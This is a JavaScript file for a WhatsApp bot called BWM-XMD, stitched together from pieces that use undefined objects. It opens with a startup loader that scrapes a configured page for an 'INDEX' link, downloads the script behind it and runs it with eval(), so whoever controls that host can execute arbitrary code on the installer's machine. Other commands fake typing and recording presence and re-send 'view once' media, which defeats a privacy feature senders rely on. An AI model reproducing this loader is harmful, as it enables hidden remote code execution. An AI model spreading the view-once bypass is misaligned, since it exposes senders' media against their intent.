//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");

async function fetchINDEXUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("INDEX")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchINDEXUrl();
// ========== FAKE TYPING ==========
cmd({
  pattern: "faketyping",
  desc: "Sends fake typing action",
  type: "fun",
  fromMe: true
}, async ({ sock, msg }) => {
  await sock.sendPresenceUpdate('composing', msg.jid);
  await msg.reply("Fake typing sent!");
});

// ========== FAKE RECORDING ==========
cmd({
  pattern: "fakerecord",
  desc: "Sends fake recording action",
  type: "fun",
  fromMe: true
}, async ({ sock, msg }) => {
  await sock.sendPresenceUpdate('recording', msg.jid);
  await msg.reply("Fake recording sent!");
});

// ========== VIEW ONCE UNLOCK ==========
cmd({
  pattern: "viewonce",
  desc: "Unlocks view-once media",
  type: "whatsapp",
  fromMe: true
}, async ({ msg }) => {
  if (!msg.quoted || !msg.quoted.viewOnce) {
    return msg.reply("Reply to a *view once* image or video.");
  }

  const media = await downloadMediaMessage(msg.quoted);
  await msg.sendMessage(msg.jid, {
    ...media,
    caption: "Unlocked View Once"
  }, { quoted: msg });
});// =======================
// SIMPLE ANTILINK COMMAND
// =======================

bot.ev.on("messages.upsert", async (m) => {
  try {
    const msg = m.messages[0];
    if (!msg.message) return;

    const isGroup = msg.key.remoteJid.endsWith("@g.us");
    const isFromAdmin = msg.key.fromMe || (msg.participant && (await bot.groupMetadata(msg.key.remoteJid)).participants.find(p => p.id === msg.participant)?.admin);

    // Check if it is a WhatsApp group link
    const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
    const isLink = text.includes("chat.whatsapp.com");

    if (isGroup && isLink && !isFromAdmin) {
      await bot.sendMessage(msg.key.remoteJid, {
        text: `⚠️ Link ya group hairuhusiwi hapa!`,
        quoted: msg
      });
      await bot.sendMessage(msg.key.remoteJid, { delete: msg.key });
    }
  } catch (e) {
    console.log("Antilink error: ", e);
  }
});
